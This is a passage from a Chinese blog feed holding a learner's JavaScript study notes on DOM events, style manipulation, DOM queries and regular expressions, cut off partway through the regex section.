        <content type="html"><![CDATA[<h1 id="学习JavaScript的第十七天-事件"><a href="#学习JavaScript的第十七天-事件" class="headerlink" title="学习JavaScript的第十七天(事件)"></a>学习JavaScript的第十七天(事件)</h1><a id="more"></a><h2 id="一、事件"><a href="#一、事件" class="headerlink" title="一、事件"></a>一、事件</h2><h3 id="1-事件"><a href="#1-事件" class="headerlink" title="1.事件"></a>1.事件</h3><p> 事件就是指文档或浏览器窗口中发生的一些特定的交互瞬间。</p><p> <img src="/js/js118.png"></p><h3 id="2-事件对象"><a href="#2-事件对象" class="headerlink" title="2.事件对象"></a>2.事件对象</h3><p> 当事件的响应函数被触发时,浏览器每次都会将一个事件对象作为实参传递进响应函数中,在事件对象中封装了当前事件相关的一切信息,比如:鼠标的坐标、鼠标的滚轮方向…</p><h3 id="3-事件方法"><a href="#3-事件方法" class="headerlink" title="3.事件方法"></a>3.事件方法</h3><h4 id="3-1-onmousemove"><a href="#3-1-onmousemove" class="headerlink" title="3.1 onmousemove"></a>3.1 onmousemove</h4><p> 该事件将会在鼠标在元素中移动时触发</p><h4 id="3-2-clientX-和-clientY"><a href="#3-2-clientX-和-clientY" class="headerlink" title="3.2 clientX 和 clientY"></a>3.2 clientX 和 clientY</h4><p> ①clientX 可以获取鼠标指针的水平坐标<br> ②clientY 可以获取鼠标指针的垂直坐标<br> 这两个用于获取鼠标在当前的可见窗口的坐标</p><p> <img src="/js/js142.png"></p><h4 id="3-3-pageX-和-pageY"><a href="#3-3-pageX-和-pageY" class="headerlink" title="3.3 pageX 和 pageY"></a>3.3 pageX 和 pageY</h4><p>  ①pageX 可以获取鼠标相对于当前页面的水平坐标<br>  ②pageY 可以获取鼠标相对于当前页面的垂直坐标<br>  ③这两个属性在IE8中不支持,所以兼容IE8则不使用</p><p><img src="/js/js143.png"></p><h2 id="二、事件冒泡-Bubble"><a href="#二、事件冒泡-Bubble" class="headerlink" title="二、事件冒泡(Bubble)"></a>二、事件冒泡(Bubble)</h2><p> ①所谓事件冒泡指的是事件的向上传导,当后代元素上的事件被触发时,其祖先元素的相同事件也会被触发</p><p> ②在开发中大部分情况冒泡都是有用的,如果不希望发生冒泡,可以通过事件对象取消</p><p> ③取消冒泡<br> 将事件对象的cancelBubble属性设置为true,取消冒泡</p><p><img src="/js/js144.png"></p><h2 id="三、事件的委派"><a href="#三、事件的委派" class="headerlink" title="三、事件的委派"></a>三、事件的委派</h2><p> ①指将事件统一绑定给元素的共同的祖先元素,这样当后代元素上的事件触发时,会一直冒泡到祖先元素,从而通过祖先元素的响应函数来处理事件</p><p> ②事件委派是利用了冒泡,通过委派可以减少事件绑定的次数,提高程序性能</p><p> ③target<br>  event中的target表示触发事件的对象(事件由谁触发就是谁)</p><p><img src="/js/js145.png"><br><img src="/js/js146.png"></p><h2 id="四、事件的绑定"><a href="#四、事件的绑定" class="headerlink" title="四、事件的绑定"></a>四、事件的绑定</h2><h3 id="4-1-对象-事件"><a href="#4-1-对象-事件" class="headerlink" title="4.1 对象.事件"></a>4.1 对象.事件</h3><p> ①使用对象.事件=函数的形式绑定的单击响应函数,它只能同时为一个元素的一个事件绑定一个响应函数,不能绑定多个,如果绑定多个,后面的会覆盖掉前面的</p><h3 id="4-2-addEventListener"><a href="#4-2-addEventListener" class="headerlink" title="4.2 addEventListener"></a>4.2 addEventListener</h3><p> ①通过这个方法也可以为元素绑定响应函数</p><p> ②参数<br>  Ⅰ.事件的字符串,不需要加on(onclick写成click)</p><p>  Ⅱ.回调函数,当事件触发时该函数会被调用</p><p>  Ⅲ.是否在捕获阶段发生事件,默认值是false(在冒泡阶段执行),true(表示在捕获阶段执行)</p><p>  Ⅳ.使用addEventListener()可以同时为一个元素的相同事件同时绑定多个响应函数,这样当事件触发时,响应函数将会按照函数的绑定顺序执行</p><p>  Ⅴ.这个方法不支持IE8</p><h3 id="4-3-attachEvent"><a href="#4-3-attachEvent" class="headerlink" title="4.3 attachEvent"></a>4.3 attachEvent</h3><p> ①在IE8中可以使用attachEvent()来绑定事件</p><p> ②参数<br>  Ⅰ.事件字符串,需要加on<br>  Ⅱ.回调函数</p><p> ③这个方法可以同时为一个事件绑定多个处理函数,不同的是它是后绑定先触发</p><p><img src="/js/js147.png"></p><h3 id="4-4-自定义函数"><a href="#4-4-自定义函数" class="headerlink" title="4.4 自定义函数"></a>4.4 自定义函数</h3><p> ①自定义一个函数,用来为指定元素绑定响应函数</p><p> ②参数<br>  Ⅰ.obj 要绑定事件的对象<br>  Ⅱ.eventStr 事件的字符串(不要on)<br>  Ⅲ.callback 回调函数</p><p><img src="/js/js148.png"></p><h2 id="五、事件的传播"><a href="#五、事件的传播" class="headerlink" title="五、事件的传播"></a>五、事件的传播</h2><h3 id="1-事件传播理解"><a href="#1-事件传播理解" class="headerlink" title="1.事件传播理解"></a>1.事件传播理解</h3><p> ①关于事件的传播网景公司和微软公司有不同的理解<br>  Ⅰ.微软公司认为事件应该是由内向外传播,也就是当事件触发时,应该先触发当前元素上的事件,然后向当前元素的祖先元素上传播,也就是说事件在冒泡阶段执行</p><p>  Ⅱ.网景公司认为事件应该是由外向内传播,也就是当事件触发时,应该先触发当前元素最外层的祖先元素的事件,然后在向内传播</p><h3 id="2-事件传播的阶段"><a href="#2-事件传播的阶段" class="headerlink" title="2.事件传播的阶段"></a>2.事件传播的阶段</h3><p> ①w3c综合了两个公司的方案,将事件的传播分为了3个阶段</p><p> ②三个阶段<br>  Ⅰ.捕获阶段<br>   在捕获阶段时从最外层的祖先元素,向目标元素进行事件的捕获,但是默认此时不会触发事件</p><p>  Ⅱ.目标阶段<br>   事件捕获到目标元素,捕获结束后开始在目标元素上触发事件</p><p>  Ⅲ.冒泡阶段<br>   事件从目标元素向它的祖先元素传递,依次触发祖先元素上的事件</p><p> ③如果希望在捕获阶段就触发事件,可以将addEventListener()的第三个参数设置为true,一般情况下,我们不会希望在捕获阶段触发事件,这个参数一般为false</p><p> ④IE8及以下浏览器中没有捕获阶段</p><p><img src="/js/js149.png"></p><h2 id="六、滚轮事件"><a href="#六、滚轮事件" class="headerlink" title="六、滚轮事件"></a>六、滚轮事件</h2><h3 id="1-鼠标滚轮事件"><a href="#1-鼠标滚轮事件" class="headerlink" title="1.鼠标滚轮事件"></a>1.鼠标滚轮事件</h3><p> ①onmousewheel<br>  鼠标滚轮滚动事件,会在滚轮滚动时触发,但火狐浏览器不支持</p><p> ②DOMMouseScroll<br>  在火狐中使用,该事件需要通过addEventListener()函数来绑定</p><h3 id="2-event-wheelDelta"><a href="#2-event-wheelDelta" class="headerlink" title="2.event.wheelDelta"></a>2.event.wheelDelta</h3><p> ①可以获取鼠标滚轮滚动的方向,向上滚动为正,向下滚动为负<br> ②火狐浏览器不支持</p><h3 id="3-event-detail"><a href="#3-event-detail" class="headerlink" title="3.event.detail"></a>3.event.detail</h3><p> ①在火狐中来获取滚轮滚动的方向,向上为负,向下为正</p><h3 id="4-取消默认行为"><a href="#4-取消默认行为" class="headerlink" title="4.取消默认行为"></a>4.取消默认行为</h3><p> 取消浏览器默认行为使用return false来取消</p><h3 id="5-取消addEventListener-绑定方法的默认行为"><a href="#5-取消addEventListener-绑定方法的默认行为" class="headerlink" title="5.取消addEventListener()绑定方法的默认行为"></a>5.取消addEventListener()绑定方法的默认行为</h3><p> 使用addEventListener()方法绑定响应函数,取消默认行为时需要用event来取消默认行为,event.preventDefault()这个方法来取消,IE8不支持</p><p><img src="/js/js150.png"><br><img src="/js/js151.png"></p><h2 id="七、键盘事件"><a href="#七、键盘事件" class="headerlink" title="七、键盘事件"></a>七、键盘事件</h2><h3 id="1-onkeydown-按键按下"><a href="#1-onkeydown-按键按下" class="headerlink" title="1.onkeydown 按键按下"></a>1.onkeydown 按键按下</h3><p> ①对于onkeydown来说如果一直按某个按键不松手,则事件会一直被触发</p><p> ②当onkeydown连续触发时,第一次和第二次之间的间隔稍微长一点,其他的会非常快,这种是为了防止误操作的发生</p><h3 id="2-onkeyup-按键被松开"><a href="#2-onkeyup-按键被松开" class="headerlink" title="2.onkeyup 按键被松开"></a>2.onkeyup 按键被松开</h3><p> ①按键被松开,不会连续触发,松开一次就触发一次</p><h3 id="3-键盘事件绑定"><a href="#3-键盘事件绑定" class="headerlink" title="3.键盘事件绑定"></a>3.键盘事件绑定</h3><p> ①键盘事件一般都会绑定给一些可以获取到焦点的对象(表单)或者是document</p><h3 id="4-keyCode"><a href="#4-keyCode" class="headerlink" title="4.keyCode"></a>4.keyCode</h3><p> ①keyCode用来获取按键的编码,通过它可以判断哪个按键被按下</p><h3 id="5-altKey"><a href="#5-altKey" class="headerlink" title="5.altKey"></a>5.altKey</h3><p> ①判断alt键是否被按下,按下返回true,否则返回false</p><h3 id="6-ctrlKey"><a href="#6-ctrlKey" class="headerlink" title="6.ctrlKey"></a>6.ctrlKey</h3><p> ①判断ctrl键是否被按下,按下返回true,否则返回false</p><h3 id="7-shiftKey"><a href="#7-shiftKey" class="headerlink" title="7.shiftKey"></a>7.shiftKey</h3><p> ①判断shift键是否被按下,按下返回true,否则返回false</p><p> 下图为获取焦点时状态<br><img src="/js/js152.png"><br><img src="/js/js153.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三十五篇博客</title>
      <link href="/2021/11/14/di-san-shi-wu-pian-bo-ke/"/>
      <url>/2021/11/14/di-san-shi-wu-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第十六天-DOM操作样式"><a href="#学习JavaScript的第十六天-DOM操作样式" class="headerlink" title="学习JavaScript的第十六天(DOM操作样式)"></a>学习JavaScript的第十六天(DOM操作样式)</h1><a id="more"></a><h2 id="一、DOM操作内联样式"><a href="#一、DOM操作内联样式" class="headerlink" title="一、DOM操作内联样式"></a>一、DOM操作内联样式</h2><h3 id="1-通过JS修改元素的样式"><a href="#1-通过JS修改元素的样式" class="headerlink" title="1.通过JS修改元素的样式"></a>1.通过JS修改元素的样式</h3><p> ①语法:<br>  元素.style.样式名 = 样式值(字符串形式)</p><p>  注意:如果css样式名中含有-(减号),这种名称在JS是不合法的<br>  例如:<br>   background-color 需要将这种样式名修改为驼峰命名法,去掉-(减号),将-(减号)后的字母大写</p><p> ②我们通过style属性设置的样式都是内联样式,而内联样式有较高的优先级,所有通过JS修改的样式会立即显示</p><p> ③如果在样式中添加!important,则此时样式会有最高的优先级,即使通过JS也无法覆盖,此时JS样式会失效,所以尽量不要为样式添加!important</p><h3 id="2-驼峰命名法"><a href="#2-驼峰命名法" class="headerlink" title="2.驼峰命名法"></a>2.驼峰命名法</h3><p> 当变量名或函数名是由一个或多个单词连结在一起,第一个单词以小写开始,从第二个单词往后的每个单词的首字母都采用大写字母,例如myName</p><h3 id="3-读取元素样式"><a href="#3-读取元素样式" class="headerlink" title="3.读取元素样式"></a>3.读取元素样式</h3><p> 通过JS读取元素的样式<br> 语法: 元素.style.样式名</p><h3 id="4-注意"><a href="#4-注意" class="headerlink" title="4.注意"></a>4.注意</h3><p> 通过style属性设置和读取的样式都是内联样式,无法读取样式表里的样式</p><p><img src="/js/js133.png"></p><h2 id="二、读取元素当前显示的样式"><a href="#二、读取元素当前显示的样式" class="headerlink" title="二、读取元素当前显示的样式"></a>二、读取元素当前显示的样式</h2><h3 id="1-currentStyle-只支持IE"><a href="#1-currentStyle-只支持IE" class="headerlink" title="1.currentStyle(只支持IE)"></a>1.currentStyle(只支持IE)</h3><p> ①语法<br> 元素.currentStyle.样式名(只支持IE浏览器)<br> 它可以用来读取当前元素正在显示的样式,如果当前元素没有设置样式,将返回样式的默认值<br> currentStyle只有IE支持,其他浏览器都不支持</p><p><img src="/js/js134.png"></p><h3 id="2-getComputedStyle-支持其他浏览器"><a href="#2-getComputedStyle-支持其他浏览器" class="headerlink" title="2.getComputedStyle(支持其他浏览器)"></a>2.getComputedStyle(支持其他浏览器)</h3><p> ①该方法用来获取元素当前正在显示的样式,这个方法是window的方法,可以直接使用</p><p> ②参数<br>  第一个参数,要获取样式的元素<br>  第二个参数,可以传递一个伪元素,一般为null</p><p> ③该方法一般会返回一个对象,对象中封装了当前元素对应的样式</p><p> ④读取方法返回的样式<br>  对象.样式名(获取样式)<br>  如果获取的样式,没有设置值,则会获取到真实的值,而不是默认值.<br>  例如:<br>   width没有设置,不会返回auto(默认值),而是返回一个真实的长度</p><p> ⑤该方法不支持IE8及以下的浏览器</p><p> ⑥通过currentStyle和getComputedStyle()读取到的样式都是只读的,不可以修改,如果要修改必须通过style属性</p><p> <img src="/js/js135.png"></p><h3 id="3-定义一个函数，用来获取指定元素的样式"><a href="#3-定义一个函数，用来获取指定元素的样式" class="headerlink" title="3.定义一个函数，用来获取指定元素的样式"></a>3.定义一个函数，用来获取指定元素的样式</h3><p>  参数: obj 要获取样式的元素  name 要获取的样式名(字符串形式)<br><img src="/js/js136.png"></p><h2 id="三、其他样式操作的属性"><a href="#三、其他样式操作的属性" class="headerlink" title="三、其他样式操作的属性"></a>三、其他样式操作的属性</h2><h3 id="3-1-clientWidth-可见宽度-和-clientHeight-可见高度"><a href="#3-1-clientWidth-可见宽度-和-clientHeight-可见高度" class="headerlink" title="3.1 clientWidth(可见宽度) 和 clientHeight(可见高度)"></a>3.1 clientWidth(可见宽度) 和 clientHeight(可见高度)</h3><p> ①这两个属性可以获取元素的可见高度和可见宽度<br> ②这些属性都不带px的,返回的都是一个数字,可以直接进行计算<br> ③会获取元素的宽度和高度,包括内容区和内边距<br> ④这些属性都是只读的,不能修改,修改用style的方式</p><p><img src="/js/js137.png"></p><h3 id="3-2-offsetWidth-整个宽度-和-offsetHeight-整个高度"><a href="#3-2-offsetWidth-整个宽度-和-offsetHeight-整个高度" class="headerlink" title="3.2 offsetWidth(整个宽度) 和 offsetHeight(整个高度)"></a>3.2 offsetWidth(整个宽度) 和 offsetHeight(整个高度)</h3><p> ①这两个属性可以获取元素的整个高度和宽度,包括内容区、内边距和边框</p><p><img src="/js/js138.png"></p><h3 id="3-3-offsetParent"><a href="#3-3-offsetParent" class="headerlink" title="3.3 offsetParent"></a>3.3 offsetParent</h3><p> ①可以获取当前元素的定位父元素<br> ②会获取到离当前元素最近的开启了定位的祖先元素,如果所有祖先元素都没开启定位,就返回body</p><h3 id="3-4-offsetLeft"><a href="#3-4-offsetLeft" class="headerlink" title="3.4 offsetLeft"></a>3.4 offsetLeft</h3><p> 获取当前元素相对于其定位父元素的水平偏移量</p><h3 id="3-5-offsetTop"><a href="#3-5-offsetTop" class="headerlink" title="3.5 offsetTop"></a>3.5 offsetTop</h3><p> 获取当前元素相对于其定位父元素的垂直偏移量</p><p><img src="/js/js139.png"></p><h3 id="3-6-scrollWidth"><a href="#3-6-scrollWidth" class="headerlink" title="3.6 scrollWidth"></a>3.6 scrollWidth</h3><p> 可以获取元素整个可以滚动区域的宽度(滚动条滚动,可以看到的都算)</p><h3 id="3-7-scrollHeight"><a href="#3-7-scrollHeight" class="headerlink" title="3.7 scrollHeight"></a>3.7 scrollHeight</h3><p> 可以获取元素整个可以滚动区域的高度(滚动条滚动,可以看到的都算)</p><h3 id="3-8-scrollLeft"><a href="#3-8-scrollLeft" class="headerlink" title="3.8 scrollLeft"></a>3.8 scrollLeft</h3><p> 可以获取水平滚动条滚动的距离</p><h3 id="3-9-scrollTop"><a href="#3-9-scrollTop" class="headerlink" title="3.9 scrollTop"></a>3.9 scrollTop</h3><p> 可以获取垂直滚动条垂直滚动的距离</p><p><img src="/js/js140.png"></p><h2 id="四、滚动条"><a href="#四、滚动条" class="headerlink" title="四、滚动条"></a>四、滚动条</h2><p> ①当满足scrollHeight - scrollTop == clientHeight时,说明垂直滚动条已经滚动到底部了</p><p> ②当满足scrollWidth - scrollLeft == clientWidth时,说明水平滚动条已经滚动到头了</p><p><img src="/js/js141.png"></p><h2 id="五、设置元素是否可用"><a href="#五、设置元素是否可用" class="headerlink" title="五、设置元素是否可用"></a>五、设置元素是否可用</h2><p> 1.disabled属性可以设置一个元素是否禁用<br>  如果设置为true,则元素禁用<br>  如果设置为false,则元素可用 </p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三十四篇博客</title>
      <link href="/2021/11/14/di-san-shi-si-pian-bo-ke/"/>
      <url>/2021/11/14/di-san-shi-si-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第十五天-DOM"><a href="#学习JavaScript的第十五天-DOM" class="headerlink" title="学习JavaScript的第十五天(DOM)"></a>学习JavaScript的第十五天(DOM)</h1><a id="more"></a><h2 id="一、DOM简介"><a href="#一、DOM简介" class="headerlink" title="一、DOM简介"></a>一、DOM简介</h2><h3 id="1-DOM"><a href="#1-DOM" class="headerlink" title="1.DOM"></a>1.DOM</h3><p> 1.DOM,全称Document Object Model文档对象模型<br> 它的作用是使用DOM来操作网页</p><p> ①文档: 表示的是整个HTML网页文档(一个网页就是一个文档)<br> ②对象: 表示网页中的每一个部分都转换为一个对象(标签、注释、文字)<br> ③模型: 使用模型来表示对象之间的关系</p><p><img src="/js/js116.png"></p><h3 id="2-节点"><a href="#2-节点" class="headerlink" title="2.节点"></a>2.节点</h3><p> 1.节点Node,构成网页的最基本的组成部分,网页中每一个部分都可以称为是一个节点<br> 2.虽然都为节点,但类型不同,节点类型不同,属性和方法也都不相同</p><p> <img src="/js/js114.png"><br> <img src="/js/js115.png"></p><h2 id="二、DOM查询"><a href="#二、DOM查询" class="headerlink" title="二、DOM查询"></a>二、DOM查询</h2><h3 id="1-获取元素-标签-节点"><a href="#1-获取元素-标签-节点" class="headerlink" title="1.获取元素(标签)节点"></a>1.获取元素(标签)节点</h3><p> 通过document对象调用</p><h4 id="1-1-getElementById"><a href="#1-1-getElementById" class="headerlink" title="1.1 getElementById"></a>1.1 getElementById</h4><p> getElementById() 通过id属性获取一个元素节点对象</p><h4 id="1-2-getElementsByTagName"><a href="#1-2-getElementsByTagName" class="headerlink" title="1.2 getElementsByTagName"></a>1.2 getElementsByTagName</h4><p> getElementsByTagName() 通过标签名获取一组元素节点对象<br> 这个方法会给我们返回一个类数组对象,所有查询到的元素都会封装到对象中,即使查询到的只有一个,也会封装到数组中返回</p><h4 id="1-3-getElementsByName"><a href="#1-3-getElementsByName" class="headerlink" title="1.3 getElementsByName"></a>1.3 getElementsByName</h4><p> getElementsByName() 通过name属性获取一组元素节点对象</p><h3 id="2-innerHTML"><a href="#2-innerHTML" class="headerlink" title="2.innerHTML"></a>2.innerHTML</h3><p> 通过该属性可以获取到元素内部的html代码,对于自结束标签,这个属性没有意义</p><h3 id="3-读取元素节点属性"><a href="#3-读取元素节点属性" class="headerlink" title="3.读取元素节点属性"></a>3.读取元素节点属性</h3><p> 读取元素节点属性,直接使用元素.属性名<br> 例如:<br>   元素.id  元素.name  元素.value<br> 注意: class属性不能采用这种方式,读取class属性时,需要使用元素.className</p><p><img src="/js/js121.png"><br><img src="/js/js122.png"></p><h3 id="4-获取元素的子节点"><a href="#4-获取元素的子节点" class="headerlink" title="4.获取元素的子节点"></a>4.获取元素的子节点</h3><p> 通过具体的子节点去调用方法</p><h4 id="4-1-getElementsByTagName"><a href="#4-1-getElementsByTagName" class="headerlink" title="4.1 getElementsByTagName"></a>4.1 getElementsByTagName</h4><p> 该方法返回当前节点的指定标签名的后代节点</p><h4 id="4-2-childNodes"><a href="#4-2-childNodes" class="headerlink" title="4.2 childNodes"></a>4.2 childNodes</h4><p> ①该属性会获取包括文本节点在内的所有子节点,根据DOM标注,标签之间的空白也会当成文本节点<br> ②在IE8及以下的浏览器中,不会将空白文本当成节点</p><h4 id="4-3-children"><a href="#4-3-children" class="headerlink" title="4.3 children"></a>4.3 children</h4><p> 该属性可以获取当前元素的所有子元素(标签)</p><h4 id="4-4-firstChild"><a href="#4-4-firstChild" class="headerlink" title="4.4 firstChild"></a>4.4 firstChild</h4><p> 该属性可以获取到当前元素的第一个子节点(包括空白文本节点)</p><h4 id="4-5-firstElementChild"><a href="#4-5-firstElementChild" class="headerlink" title="4.5 firstElementChild"></a>4.5 firstElementChild</h4><p> 该属性获取当前元素的第一个子元素,不支持IE8及以下的浏览器,如果要兼容,尽量不要使用</p><h4 id="4-6-lastChild"><a href="#4-6-lastChild" class="headerlink" title="4.6 lastChild"></a>4.6 lastChild</h4><p> 该属性获取当前节点的最后一个子节点</p><p><img src="/js/js123.png"><br><img src="/js/js124.png"><br><img src="/js/js125.png"></p><h3 id="5-获取元素的父节点"><a href="#5-获取元素的父节点" class="headerlink" title="5.获取元素的父节点"></a>5.获取元素的父节点</h3><p> 通过具体的节点调用</p><h4 id="5-1-parentNode"><a href="#5-1-parentNode" class="headerlink" title="5.1 parentNode"></a>5.1 parentNode</h4><p> 该属性获取当前节点的父节点</p><h4 id="5-2-previousSibling"><a href="#5-2-previousSibling" class="headerlink" title="5.2 previousSibling"></a>5.2 previousSibling</h4><p> 该属性获取当前节点的前一个兄弟节点(也可能获取到空白文本节点)</p><h4 id="5-3-previousElementSibling"><a href="#5-3-previousElementSibling" class="headerlink" title="5.3 previousElementSibling"></a>5.3 previousElementSibling</h4><p> 该属性获取当前节点的前一个兄弟元素,IE8不支持(不包含空白文本节点)</p><h4 id="5-4-nextSibling"><a href="#5-4-nextSibling" class="headerlink" title="5.4 nextSibling"></a>5.4 nextSibling</h4><p> 该属性获取当前节点的后一个兄弟节点</p><h4 id="5-5-innerText"><a href="#5-5-innerText" class="headerlink" title="5.5 innerText"></a>5.5 innerText</h4><p> 该属性可以获取到元素内部的文本内容<br> 它和innerHTML类似,不同的是它会自动将html标签去除掉</p><p><img src="/js/js126.png"><br><img src="/js/js127.png"></p><h3 id="6-DOM查询的其他方法"><a href="#6-DOM查询的其他方法" class="headerlink" title="6.DOM查询的其他方法"></a>6.DOM查询的其他方法</h3><p> ①在document中有一个属性body,它保存的是body对象的引用,表示 <body> 元素(var body = document.body)</p><p> ②document.documentElement保存的是html根标签</p><p> ③document.all代表页面中的所有元素<br> (document.getElementsByTagName(‘*’)保存的页面的所有元素)</p><p> ④根据元素的class属性值查询一组元素节点对象<br> getElementsByClassName() 可以根据class属性值获取一组元素节点对象,但是该方法不支持IE8及以下浏览器</p><p> ⑤document.querySelector<br>  Ⅰ.需要一个选择器的字符串作为参数,可以根据一个css选择器来查询一个节点对象<br>  Ⅱ.IE8支持<br>  Ⅲ.使用该方法总会返回唯一的一个元素,如果满足条件的元素有多个,它只会返回第一个</p><p> ⑥document.querySelectorAll<br>  Ⅰ.该方法和document.querySelector()用法类似,不同的是它会将符合条件的元素封装到一个数组中返回,即使符合条件的元素只有一个,它也会返回数组</p><p><img src="/js/js128.png"><br><img src="/js/js129.png"></p><h2 id="三、DOM增删改"><a href="#三、DOM增删改" class="headerlink" title="三、DOM增删改"></a>三、DOM增删改</h2><h3 id="1-document-createElement"><a href="#1-document-createElement" class="headerlink" title="1.document.createElement"></a>1.document.createElement</h3><p> 可以用于创建一个元素节点对象,它需要一个标签名作为参数,将会根据该标签名创建对应的元素节点对象,并将创建好的对象作为返回值返回</p><h3 id="2-document-createTextNode"><a href="#2-document-createTextNode" class="headerlink" title="2.document.createTextNode"></a>2.document.createTextNode</h3><p> 可以用来创建一个文本节点对象,它需要一个文本内容作为参数,将会根据文本内容创建文本节点,并将新的节点返回</p><h3 id="3-appendChild"><a href="#3-appendChild" class="headerlink" title="3.appendChild"></a>3.appendChild</h3><p> ①向一个父节点中添加一个新的子节点<br> ②用法:<br>  父元素(父节点).appendChild(子节点)</p><h3 id="4-insertBefore"><a href="#4-insertBefore" class="headerlink" title="4.insertBefore"></a>4.insertBefore</h3><p> ①可以在指定的子节点前插入新的子节点<br> ②语法:<br>  父节点.insertBefore(新节点,旧节点)</p><h3 id="5-removeChild"><a href="#5-removeChild" class="headerlink" title="5.removeChild"></a>5.removeChild</h3><p> ①可以删除一个子节点<br> ②语法:<br>  父节点.removeChild(子节点)<br>  子节点.parentNode.removeChild(子节点)</p><h3 id="6-replaceChild"><a href="#6-replaceChild" class="headerlink" title="6.replaceChild"></a>6.replaceChild</h3><p> ①可以使用指定的子节点替换已有的子节点<br> ②语法:<br>  父节点.replaceChild(新节点,旧节点)</p><p><img src="/js/js130.png"><br><img src="/js/js131.png"><br><img src="/js/js132.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三十三篇博客</title>
      <link href="/2021/11/03/di-san-shi-san-pian-bo-ke/"/>
      <url>/2021/11/03/di-san-shi-san-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第十四天-正则表达式"><a href="#学习JavaScript的第十四天-正则表达式" class="headerlink" title="学习JavaScript的第十四天(正则表达式)"></a>学习JavaScript的第十四天(正则表达式)</h1><a id="more"></a><h2 id="一、正则表达式"><a href="#一、正则表达式" class="headerlink" title="一、正则表达式"></a>一、正则表达式</h2><h3 id="1-什么是正则"><a href="#1-什么是正则" class="headerlink" title="1.什么是正则"></a>1.什么是正则</h3><p> 正则表达式用于定义一些字符串的规则,计算机可以根据正则表达式来检查一个字符串是否符合规则,或者将字符串中符合规则的字符提取出来</p><h3 id="2-创建正则表达式"><a href="#2-创建正则表达式" class="headerlink" title="2.创建正则表达式"></a>2.创建正则表达式</h3><p> 语法: var 变量 = new RegExp(‘正则表达式’,’匹配模式’);<br> ①两个参数都是字符串<br>   Ⅰ.第一个参数为正则表达式<br>   Ⅱ.第二个参数为匹配模式</p><p> ②使用typeof检查正则对象,会返回object</p><p> ③var res = new RegExp(‘a’,’i’)<br>   这个正则表达式可以用来检查一个字符串中是否含有a,忽略大小写,有就返回true,没有返回false</p><p> ④在构造函数中,可以传递一个匹配模式作为第二个参数,可以是i(忽略大小写)、g(全局匹配模式)</p><h3 id="3-正则表达式的方法"><a href="#3-正则表达式的方法" class="headerlink" title="3.正则表达式的方法"></a>3.正则表达式的方法</h3><p> test()<br> 该方法可以用来检查一个字符串是否符合正则表达式的规则,符合返回true,不符合返回false</p><p> <img src="/js/js110.png"></p><h2 id="二、正则表达式的语法"><a href="#二、正则表达式的语法" class="headerlink" title="二、正则表达式的语法"></a>二、正则表达式的语法</h2><h3 id="1-使用字面量来创建正则表达式"><a href="#1-使用字面量来创建正则表达式" class="headerlink" title="1.使用字面量来创建正则表达式"></a>1.使用字面量来创建正则表达式</h3><p> 语法: var 变量 = /正则表达式/匹配模式(这里要注意不是字符串,构造函数创建时为字符串)<br> 使用字面量创建更加简单,使用构造函数创建更加灵活</p><h3 id="2"><a href="#2" class="headerlink" title="2.|"></a>2.|</h3><p> 使用”|”表示或者的意思</p><h3 id="3"><a href="#3" class="headerlink" title="3.[]"></a>3.[]</h3><p> 使用”[]”, “[]”里面的内容也是或的关系<br> 例如:<br>  ①”[ab]” == a|b(a或b)<br>  ②”[a-z]” 表示任意的小写字母<br>  ③”[A-Z]” 表示任意大写字母<br>  ④”[A-z]” 表示任意字母<br>  ⑤”[0-9]” 表示任意数字</p><h3 id="4"><a href="#4" class="headerlink" title="4.[^]"></a>4.[^]</h3><p> 使用”[^]”,表示除了括号内的字符都可以<br> 例如:<br>  ①[^ab] 表示找除了ab以外的字符,如果有就返回true,没有则返回false<br>  var reg = /[^ab]/<br>  reg.test(‘abc’)<br>  返回true,该字符串除了ab,还剩下c<br>  ②[^0-9] 表示除了数字</p><p><img src="/js/js111.png"></p><h2 id="三、字符串和正则相关的方法"><a href="#三、字符串和正则相关的方法" class="headerlink" title="三、字符串和正则相关的方法"></a>三、字符串和正则相关的方法</h2><h3 id="1-split"><a href="#1-split" class="headerlink" title="1.split"></a>1.split</h3><p> 该方法可以将一个字符串拆分为一个数组<br> ①方法中可以传递一个正则表达式作为参数,这样方法将会根据正则表达式去拆分字符串<br> var str = ‘1a2b3c4d5’ str.split(/[A-z]/) //1,2,3,4,5<br> ②这个方法即使不设置全局匹配,也会全部进行拆分</p><h3 id="2-search"><a href="#2-search" class="headerlink" title="2.search"></a>2.search</h3><p> 该方法可以检索字符串中是否含有指定内容<br>  ①如果搜索到指定内容,则会返回第一次出现的索引<br>  ②如果没有搜索到,则会返回-1<br>  ③它可以接收一个正则表达式来作为参数,根据正则表达式去检索字符串<br>  ④search只会检索第一个出现的,即使设置全局匹配也没有用</p><h3 id="3-match"><a href="#3-match" class="headerlink" title="3.match"></a>3.match</h3><p> 该方法可以根据正则表达式,从一个字符串中将符合要求的内容提取出来<br> ①默认情况下,match只会找到第一个符合要求的内容,找到后就停止检索<br> ②我们可以设置一个全局匹配模式,这样就会匹配到所有内容<br> ③可以为一个正则表达式设置多个匹配模式,顺序无所谓<br> /[a-z]/ig(设置两种匹配模式,既忽略大小写也全局匹配)<br> ④match会将所有匹配到的内容封装到一个数组中返回,即使只匹配到一个结果,也会封装到数组中</p><h3 id="4-replace"><a href="#4-replace" class="headerlink" title="4.replace"></a>4.replace</h3><p> 该方法可以将字符串中指定内容替换为新的内容<br> 参数:<br> ①第一个参数为被替换的内容,可以接收一个正则表达式作为参数<br> ②第二个参数为新的内容(替换内容)<br> 该方法默认只会替换第一个出现的,可以设置其匹配模式为全局匹配(g)则进行全局匹配</p><p> <img src="/js/js112.png"></p><h2 id="四、正则表达式语法"><a href="#四、正则表达式语法" class="headerlink" title="四、正则表达式语法"></a>四、正则表达式语法</h2><h3 id="1-量词-数量"><a href="#1-量词-数量" class="headerlink" title="1.量词(数量)"></a>1.量词(数量)</h3><p> ①通过量词可以设置一个内容出现的次数<br> ②量词只对它前边的一个内容起作用<br> 例如:<br>  ab{3} b出现3次   (ab){3} 这样写是ab出现3次<br>  a{n}    